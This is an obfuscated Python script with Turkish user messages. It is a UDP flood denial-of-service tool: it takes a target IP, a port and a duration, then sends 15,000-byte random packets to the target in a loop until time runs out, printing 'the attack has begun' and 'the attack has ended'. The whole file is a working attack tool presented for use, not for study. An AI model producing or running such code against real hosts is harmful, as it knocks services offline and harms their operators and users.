""" 
Python code obfuscated by mizah :)
 
"""

#!/usr/bin/python
import socket ,random ,sys ,time #line:2
if len (sys .argv )==1 :#line:4
    sys .exit ('Kullanım : python mizah.py ip port lenght(T.E = 30)')#line:5
mizah ="Saldırı Başlamıştır. Aferin Denyo"#line:7
def mizahattack ():#line:9
    OOOOOO0OOOOOO00O0 =int (sys .argv [2 ])#line:10
    O00OO00000O0OO0O0 =(True ,False )[OOOOOO0OOOOOO00O0 ==0 ]#line:11
    OO00O00O0O0000OOO =sys .argv [1 ]#line:12
    OOO0O0O0000000O0O =int (sys .argv [3 ])#line:13
    OOOO00OO0O00OOO0O =(lambda :0 ,time .clock )[OOO0O0O0000000O0O >0 ]#line:14
    O00O00O0O00O00O0O =(1 ,(OOOO00OO0O00OOO0O ()+OOO0O0O0000000O0O ))[OOO0O0O0000000O0O >0 ]#line:15
    print (mizah )#line:16
    O0O000O0OO00O00OO =socket .socket (socket .AF_INET ,socket .SOCK_DGRAM )#line:17
    O000OO0O0O00OO0O0 =random ._urandom (15000 )#line:18
    while True :#line:19
        OOOOOO0OOOOOO00O0 =(random .randint (1 ,15000000 ),OOOOOO0OOOOOO00O0 )[O00OO00000O0OO0O0 ]#line:20
        if OOOO00OO0O00OOO0O ()<O00O00O0O00O00O0O :#line:21
            O0O000O0OO00O00OO .sendto (O000OO0O0O00OO0O0 ,(OO00O00O0O0000OOO ,OOOOOO0OOOOOO00O0 ))#line:22
        else :#line:23
            break #line:24
    print ('Saldırı Bitmiştir.')#line:25
mizahattack ()#line:26
